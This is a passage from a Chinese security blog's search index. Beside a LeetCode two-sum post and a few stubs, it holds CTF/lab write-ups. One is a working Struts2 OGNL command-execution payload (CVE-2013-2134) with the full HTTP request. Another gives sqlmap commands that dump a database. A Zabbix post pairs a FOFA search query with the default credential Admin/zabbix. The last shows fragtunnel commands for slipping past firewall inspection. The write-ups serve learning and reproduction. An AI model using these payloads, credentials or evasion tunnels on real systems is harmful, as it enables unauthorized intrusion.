class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>车联网安全的一些面试资料</title>
      <link href="/2024/11/13/2024-02-29-%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
      <url>/2024/11/13/2024-02-29-%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><a href="https://mp.weixin.qq.com/s/LRnX_2wLKMWjh-slecpqig">微信公众号ICV安全面试</a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ICV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>之前的文章</title>
      <link href="/2024/11/13/2024-02-29-test-pass/"/>
      <url>/2024/11/13/2024-02-29-test-pass/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="文章迁移"><a href="#文章迁移" class="headerlink" title="文章迁移"></a>文章迁移</h1><p>由于更改模板，之前文章归档于</p><p><a href="https://leonooo13.github.io/leonooo13.github.io.old/">old</a>  </p><p>由于相对路径问题阅读前替换为该地址</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> Demo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sum of two numbers</title>
      <link href="/2024/11/13/2024-02-28-twosum/"/>
      <url>/2024/11/13/2024-02-28-twosum/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>leetcode 1. 两数之和</p><h1 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h1><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><pre><code>双指针时间复杂度O(nlogn)空间复杂度O(1)代码如下：</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    nums = [(v, i) <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums)]</span><br><span class="line">    nums.sort()</span><br><span class="line">    left, right = <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="keyword">if</span> nums[left][<span class="number">0</span>] + nums[right][<span class="number">0</span>] == target:</span><br><span class="line">            <span class="keyword">return</span> [nums[left][<span class="number">1</span>], nums[right][<span class="number">1</span>]]</span><br><span class="line">        <span class="keyword">elif</span> nums[left][<span class="number">0</span>] + nums[right][<span class="number">0</span>] &lt; target:</span><br><span class="line">            left += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><pre><code>哈希表时间复杂度O(n)空间复杂度O(n)代码如下：</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    hashmap = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        <span class="keyword">if</span> target - num <span class="keyword">in</span> hashmap:</span><br><span class="line">            <span class="keyword">return</span> [hashmap[target - num], i]</span><br><span class="line">        hashmap[num] = i</span><br><span class="line">    <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2013-2134</title>
      <link href="/2024/11/13/2024-02-21-CVE-2013-2134/"/>
      <url>/2024/11/13/2024-02-21-CVE-2013-2134/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>2.3.14.3 之前的 Apache Struts 2 允许远程攻击者通过带有在通配符匹配期间未正确处理的精心制作的操作名称的请求执行任意 OGNL 代码，这是与 CVE-2013-2135 不同的漏洞。</p><p><a href="https://img2.imgtp.com/2024/03/02/2AHlKUKx.png" title="1709310627242.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/2AHlKUKx.png" alt="1709310627242.png"></a></p><p>​如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 <code>$&#123;param_name&#125;</code> 作为重定向变量，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><p>要经过 URL 编码后才能使用：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET /%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27pwd%27%29.getInputStream%28%29%29%2C%23q%7D.action HTTP/1.1</span><br><span class="line">Host: eci-2ze2jfnjxjq8n9r88rn2.cloudeci1.ichunqiu.com:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1701181998</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><blockquote><p>注意：执行的命令存在空格用’,’替换 例如： <code>ls -l</code>命令改成 <code>ls&#39;,&#39;-l</code><br>原理一：一旦配置通配符*，访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p></blockquote><blockquote><p>不知道为啥<code>/</code>无法使用，所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p></blockquote><p>最后用的工具</p><p><a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-23134</title>
      <link href="/2024/11/13/2024-02-19-CVE-2022-23134/"/>
      <url>/2024/11/13/2024-02-19-CVE-2022-23134/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2022-23134"><a href="#CVE-2022-23134" class="headerlink" title="CVE-2022-23134"></a>CVE-2022-23134</h2><ol><li>描述</li></ol><p>Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p><ol start="2"><li>分析<br><a href="https://img2.imgtp.com/2024/03/02/gXvwQ71v.png" title="1709358782253.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/gXvwQ71v.png" alt="1709358782253.png"></a></li></ol><h2 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h2><p><code>Title=&quot;Zabbix&quot; &amp;&amp; body=&quot;Zabbix SIA&quot;</code></p><p>弱口令：<code>Admin/zabbix</code></p><p><a href="https://img2.imgtp.com/2024/03/02/LifiuzlA.png" title="1709359619020.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/LifiuzlA.png" alt="1709359619020.png"></a></p><p><a href="https://img2.imgtp.com/2024/03/02/CF8WaglB.png" title="1709359666403.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/CF8WaglB.png" alt="1709359666403.png"></a></p><p><a href="https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png" title="1709359728362.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png" alt="1709359728362.png"></a></p><p>flag{3669658d-5ca3-47d7-943c-3d985df13fab}</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-32991</title>
      <link href="/2024/11/13/2024-02-20-CVE-2022-32991/"/>
      <url>/2024/11/13/2024-02-20-CVE-2022-32991/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该CMS的welcome.php中存在SQL注入攻击。</p><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><code>/welcome.php</code></p><p><a href="/assets/img/image-1.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-1.png" alt="Alt text"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>注册登录</p><p>在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。S<br><a href="/assets/img/image-2.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-2.png" alt="Alt text"></a><br>存在SQL注入漏洞，可以通过<code>eid</code>参数进行注入。</p><p>查询数据库</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch --dbs</code></p><p>指定数据库的表</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch -D &quot;ctf&quot; --tables</code></p><p>指定表的列<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; --columns</code></p><p>指定列的数据<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</code></p><p><a href="/assets/img/image-3.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-3.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在工作中成长</title>
      <link href="/2024/11/13/2023-12-09-%E5%A6%82%E4%BD%95%E5%9C%A8%E5%B7%A5%E4%BD%9C%E4%B8%AD%E6%88%90%E9%95%BF/"/>
      <url>/2024/11/13/2023-12-09-%E5%A6%82%E4%BD%95%E5%9C%A8%E5%B7%A5%E4%BD%9C%E4%B8%AD%E6%88%90%E9%95%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>或多或少有些在工作中遇到瓶颈期</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> career </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wlb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 代码审计- SQLinjection</title>
      <link href="/2024/11/13/2024-01-30-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/11/13/2024-01-30-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="Java-代码审计-SQLinjection"><a href="#Java-代码审计-SQLinjection" class="headerlink" title="Java 代码审计- SQLinjection"></a>Java 代码审计- SQLinjection</h1><p><a href="/image.png" title="Alt text" class="gallery-item"><img src="/image.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过下一代防火墙</title>
      <link href="/2024/11/13/2024-09-05-bypassthenextfirewall/"/>
      <url>/2024/11/13/2024-09-05-bypassthenextfirewall/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>防火墙是网络安全的关键部分，它充当受信任的内部网络和不受信任的外部网络（如 Internet）之间的屏障。根据预定义的安全规则监控和控制传入和传出的网络流量。</p><p>防火墙可以作为硬件设备、软件应用程序或两者的组合来实现。它们有多种用途：</p><ol><li><p><strong>存取控制：</strong> 防火墙根据配置的规则来调节允许或阻止哪些网络连接。</p></li><li><p><strong>威胁预防：</strong> 它们可以防止各种外部威胁，例如恶意软件、病毒和潜在的黑客攻击。</p></li><li><p><strong>流量过滤：</strong> 防火墙可以配置为根据各种标准允许或阻止特定类型的网络流量，包括：</p><ul><li>源 IP 地址和目标 IP 地址</li><li>端口号</li><li>协议</li><li>应用层数据</li></ul></li></ol><p>4. <strong>日志记录和监控：</strong> 许多防火墙提供网络活动的详细日志，使安全团队能够检测和响应潜在威胁。</p><p>5. <strong>网络地址转换 （NAT）：</strong> 一些防火墙执行 NAT，这有助于向外部网络隐藏内部网络地址，从而增加额外的安全层。</p><p>现代防火墙超越了简单的数据包过滤。它们结合了深度数据包检测和应用程序级过滤等高级功能，以针对复杂的网络威胁提供更全面的保护。</p><p>在本文中，我们将重点介绍在 OSI 模型的第 7 层（也称为应用程序层）运行的防火墙。</p><h1 id="设计缺陷"><a href="#设计缺陷" class="headerlink" title="设计缺陷"></a>设计缺陷</h1><p>当您了解下一代防火墙 （NGFW） 的工作原理时，您可能会注意到一些有趣的事情。假设防火墙规则为<strong>只有组 A 可以使用 Web 端口（80 和 443）</strong>。使用 nmap 等工具进行初始端口扫描可能会显示许多开放端口，这可能会误导观察者认为防火墙配置错误或无效。但是，当尝试连接到那些看起来打开的端口时，连接很快就会意外断开。</p><p>此行为的一个具体示例可以在 <code>Cisco Firepower </code>威胁防御 （FTD） 中看到，它使用 Snort 引擎进行深度数据包检测。根据 Cisco 文档：</p><p>“为了让 <code>Snort </code>引擎确定应用程序，它必须检查几个数据包（通常为 3-10 个，具体取决于应用程序解码器）。因此，允许某些数据包通过 FTD 并到达目的地。允许的数据包仍根据“在确定访问控制规则之前使用的 <code>Access Policy &gt; Advanced &gt; Intrusion Policy</code>”选项进行入侵策略控制。</p><p>这意味着，即使连接似乎已启动，防火墙也可能在解析这些初始数据包后阻止它。这种方法允许防火墙对流量做出更明智的决策，但也可能导致出现实际上无法访问的“开放”端口。</p><p><a href="https://miro.medium.com/v2/resize:fit:952/0*dCFT-ep3rUNhCjGj" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:952/0*dCFT-ep3rUNhCjGj"></a></p><p>要了解这种情况是如何发生的，了解 TCP 连接的工作原理会很有帮助。</p><p><a href="https://miro.medium.com/v2/resize:fit:700/0*lOZrpK46ED6M3_z0" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:700/0*lOZrpK46ED6M3_z0"></a></p><p>建立 TCP 连接：</p><p>1. <strong>SYN：</strong> 客户端发送一个序列号为随机 A 的 SYN 数据包。</p><p>2. <strong>SYN-ACK：</strong> 服务器以 SYN-ACK 响应。确认编号为 A + 1，并将其自己的序列号设置为 B。</p><p>3. <strong>Acknowledgment：</strong> 客户端发送序号为 A + 1 且鸣谢编号为 B + 1 的 ACK。</p><p>从现在开始，应用程序可以开始通过创建的会话进行通信和发送数据。要关闭连接，要终止通信的终端节点将启动连接终止：</p><p>终止 TCP 连接：</p><p>1. <strong>FIN：</strong> 主机发送 FIN 数据包以开始关闭连接。</p><p>2. <strong>Acknowledgment：</strong> 另一位主持人确认 FIN。</p><p>3. <strong>FIN：</strong> 第二台主机在准备关闭时发送自己的 FIN。</p><p>4. <strong>Acknowledgment：</strong> 第一个主机发送最终 ACK。</p><h1 id="回归基础"><a href="#回归基础" class="headerlink" title="回归基础"></a>回归基础</h1><p>到目前为止，我们知道 IPS&#x2F;IDS 引擎最初会允许一些数据包通过，直到它确定它是否是恶意&#x2F;恶意流量。因此，我们可以改变常见的编程实践并利用此功能。</p><p>套接字调度的一般架构如下所示：</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*n2MMEogst5L7XF46" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*n2MMEogst5L7XF46"></a></p><p>我们可以连接、发送数据、接收响应、关闭套接字并重复。这有助于避免被 IDS&#x2F;IPS 系统检测到，否则可能会阻止连接。修改后的算法如下所示：</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*0Rq3FOJj6U9pkb1P" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*0Rq3FOJj6U9pkb1P"></a></p><p>这正是 <code>Fragtunnel</code> 所做的！</p><h2 id="Fragtunnel"><a href="#Fragtunnel" class="headerlink" title="Fragtunnel"></a>Fragtunnel</h2><p>这种基于 Python 的 TCP 隧道工具提供了一种绕过下一代防火墙的独特方法：</p><p><strong>基本功能：</strong></p><ol><li>它不同于传统代理或标准隧道。</li><li>允许将应用程序流量路由到目标服务器，避免 NGFW 检测。</li></ol><p><strong>操作机制：</strong></p><ol><li><strong>数据碎片化：</strong> 应用程序的传入数据被拆分为较小的块。</li><li><strong>多会话传输：</strong> 每个片段都通过单独的 TCP 会话单独发送。</li><li><strong>数据重组：</strong> 片段在目标位置重新组合以重建原始数据。</li><li><strong>最终交付：</strong> 重新组合的数据将转发到预期目标。</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>要开始使用，只需从 GitHub 下载脚本并运行它。但是，请注意，需要设置隧道服务器和隧道客户端才能使脚本正常工作。</p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>在服务器上执行以下步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/efeali/fragtunnel.git</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fragtunnel/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 fragtunnel.py -b 127.0.0.1：80 -v**</span><br></pre></td></tr></table></figure><ul><li><strong>-b， –bind</strong>：指定 IP 地址和端口，隧道服务器将在其上侦听传入连接。</li><li><strong>v， –verbose</strong>：启用 verbose 模式，在运行隧道应用程序时提供更详细的输出或日志记录信息。</li></ul><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> Python fragtunnel.py -p 1234 -t ：80 -T ：80 -v</span><br></pre></td></tr></table></figure><ul><li>-p、–port：指定本地应用程序将侦听以建立连接的端口号。</li><li>-t， –target：指定本地应用程序要连接到的目标服务器或服务的 IP 地址和端口。</li><li>-T， –Tunnel：指定隧道服务器的 IP 地址和端口，以便于本地应用程序和目标服务器之间的连接。</li></ul><p>一旦 <code>tunnel </code>客户端执行并连接到 <code>tunnel</code> 服务器，您就可以与目标进行交互，就像直接在计算机上本地访问它一样。</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*qqUHgxReL14a9lXi" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*qqUHgxReL14a9lXi"></a></p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*ljeH8mwFDWsGjslX" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*ljeH8mwFDWsGjslX"></a></p><p>如果我们运行 tcpdump，我们会注意到所有通信都是与服务器进行的，在本例中为 AWS。</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*20hXmz0-tmMvVrN8" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*20hXmz0-tmMvVrN8"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在许多情况下，当我们进行侦察时，我们注意到我们可以扫描服务器并获取端口信息，但是当我们尝试连接到系统时，它被防火墙阻止了。对这些下一代系统的工作原理有一点了解可以帮助我们克服它们。</p><p>大多数下一代防火墙使用的 IDS&#x2F;IPS 引擎允许一些数据包到达目的地，同时收集足够的信息来判断是允许还是阻止流量。这是一个设计缺陷，可以利用它让我们使用 <code>fragtunnel </code>等工具不受限制地访问服务器。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Device </category>
          
          <category> Firewall </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sec </tag>
            
            <tag> Firewall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的博客</title>
      <link href="/2024/11/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/11/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
